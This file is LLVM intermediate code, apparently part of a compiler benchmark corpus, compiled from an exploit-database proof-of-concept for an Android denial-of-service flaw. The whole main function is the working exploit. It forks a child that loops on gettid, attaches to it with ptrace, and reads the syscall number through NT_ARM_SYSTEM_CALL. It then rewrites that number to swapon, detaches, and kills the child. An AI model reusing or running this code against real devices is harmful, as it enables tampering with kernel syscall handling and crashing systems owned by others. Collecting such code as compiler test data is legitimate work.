; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/android/dos/extr_46434.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/android/dos/extr_46434.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.iovec = type { i32*, i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@errno = common dso_local global i64 0, align 8
@__NR_gettid = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"%d (%s)\0A\00", align 1
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [14 x i8] c"ptrace attach\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"wait for child\00", align 1
@PTRACE_SYSCALL = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [21 x i8] c"ptrace syscall entry\00", align 1
@PTRACE_GETREGSET = common dso_local global i32 0, align 4
@NT_ARM_SYSTEM_CALL = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [15 x i8] c"ptrace getregs\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"seeing syscall %d\0A\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"not gettid\00", align 1
@__NR_swapon = common dso_local global i32 0, align 4
@PTRACE_SETREGSET = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [15 x i8] c"ptrace setregs\00", align 1
@PTRACE_DETACH = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [15 x i8] c"ptrace syscall\00", align 1
@SIGCONT = common dso_local global i32 0, align 4
@SIGKILL = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.iovec, align 8
  store i32 0, i32* %1, align 4
  %8 = load i32, i32* @stdout, align 4
  %9 = call i32 @setbuf(i32 %8, i32* null)
  %10 = call i32 (...) @fork()
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %13, label %15

13:                                               ; preds = %0
  %14 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %15

15:                                               ; preds = %13, %0
  %16 = load i32, i32* %2, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %32

18:                                               ; preds = %15
  %19 = call i32 (...) @getpid()
  store i32 %19, i32* %3, align 4
  br label %20

20:                                               ; preds = %18, %31
  store i64 0, i64* @errno, align 8
  %21 = load i32, i32* @__NR_gettid, align 4
  %22 = call i32 @syscall(i32 %21, i32 0, i32 0)
  store i32 %22, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  %24 = load i32, i32* %3, align 4
  %25 = icmp ne i32 %23, %24
  br i1 %25, label %26, label %31

26:                                               ; preds = %20
  %27 = load i32, i32* %4, align 4
  %28 = load i64, i64* @errno, align 8
  %29 = call i8* @strerror(i64 %28)
  %30 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i32 %27, i8* %29)
  br label %31

31:                                               ; preds = %26, %20
  br label %20

32:                                               ; preds = %15
  %33 = call i32 @sleep(i32 1)
  %34 = load i32, i32* @PTRACE_ATTACH, align 4
  %35 = load i32, i32* %2, align 4
  %36 = call i64 @ptrace(i32 %34, i32 %35, i32* null, %struct.iovec* null)
  %37 = icmp ne i64 %36, 0
  br i1 %37, label %38, label %40

38:                                               ; preds = %32
  %39 = call i32 @err(i32 1, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %32
  %41 = load i32, i32* %2, align 4
  %42 = call i32 @waitpid(i32 %41, i32* %5, i32 0)
  %43 = load i32, i32* %2, align 4
  %44 = icmp ne i32 %42, %43
  br i1 %44, label %45, label %47

45:                                               ; preds = %40
  %46 = call i32 @err(i32 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  br label %47

47:                                               ; preds = %45, %40
  %48 = load i32, i32* @PTRACE_SYSCALL, align 4
  %49 = load i32, i32* %2, align 4
  %50 = call i64 @ptrace(i32 %48, i32 %49, i32* null, %struct.iovec* null)
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %54

52:                                               ; preds = %47
  %53 = call i32 @err(i32 1, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  br label %54

54:                                               ; preds = %52, %47
  %55 = load i32, i32* %2, align 4
  %56 = call i32 @waitpid(i32 %55, i32* %5, i32 0)
  %57 = load i32, i32* %2, align 4
  %58 = icmp ne i32 %56, %57
  br i1 %58, label %59, label %61

59:                                               ; preds = %54
  %60 = call i32 @err(i32 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  br label %61

61:                                               ; preds = %59, %54
  %62 = getelementptr inbounds %struct.iovec, %struct.iovec* %7, i32 0, i32 0
  store i32* %6, i32** %62, align 8
  %63 = getelementptr inbounds %struct.iovec, %struct.iovec* %7, i32 0, i32 1
  store i32 4, i32* %63, align 8
  %64 = load i32, i32* @PTRACE_GETREGSET, align 4
  %65 = load i32, i32* %2, align 4
  %66 = load i32*, i32** @NT_ARM_SYSTEM_CALL, align 8
  %67 = call i64 @ptrace(i32 %64, i32 %65, i32* %66, %struct.iovec* %7)
  %68 = icmp ne i64 %67, 0
  br i1 %68, label %69, label %71

69:                                               ; preds = %61
  %70 = call i32 @err(i32 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  br label %71

71:                                               ; preds = %69, %61
  %72 = load i32, i32* %6, align 4
  %73 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i32 %72)
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* @__NR_gettid, align 4
  %76 = icmp ne i32 %74, %75
  br i1 %76, label %77, label %79

77:                                               ; preds = %71
  %78 = call i32 @errx(i32 1, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0))
  br label %79

79:                                               ; preds = %77, %71
  %80 = load i32, i32* @__NR_swapon, align 4
  store i32 %80, i32* %6, align 4
  %81 = load i32, i32* @PTRACE_SETREGSET, align 4
  %82 = load i32, i32* %2, align 4
  %83 = load i32*, i32** @NT_ARM_SYSTEM_CALL, align 8
  %84 = call i64 @ptrace(i32 %81, i32 %82, i32* %83, %struct.iovec* %7)
  %85 = icmp ne i64 %84, 0
  br i1 %85, label %86, label %88

86:                                               ; preds = %79
  %87 = call i32 @err(i32 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0))
  br label %88

88:                                               ; preds = %86, %79
  %89 = load i32, i32* @PTRACE_DETACH, align 4
  %90 = load i32, i32* %2, align 4
  %91 = call i64 @ptrace(i32 %89, i32 %90, i32* null, %struct.iovec* null)
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %93, label %95

93:                                               ; preds = %88
  %94 = call i32 @err(i32 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0))
  br label %95

95:                                               ; preds = %93, %88
  %96 = load i32, i32* %2, align 4
  %97 = load i32, i32* @SIGCONT, align 4
  %98 = call i32 @kill(i32 %96, i32 %97)
  %99 = call i32 @sleep(i32 5)
  %100 = load i32, i32* %2, align 4
  %101 = load i32, i32* @SIGKILL, align 4
  %102 = call i32 @kill(i32 %100, i32 %101)
  ret i32 0
}

declare dso_local i32 @setbuf(i32, i32*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @syscall(i32, i32, i32) #1

declare dso_local i32 @printf(i8*, i32, ...) #1

declare dso_local i8* @strerror(i64) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @ptrace(i32, i32, i32*, %struct.iovec*) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

declare dso_local i32 @errx(i32, i8*) #1

declare dso_local i32 @kill(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
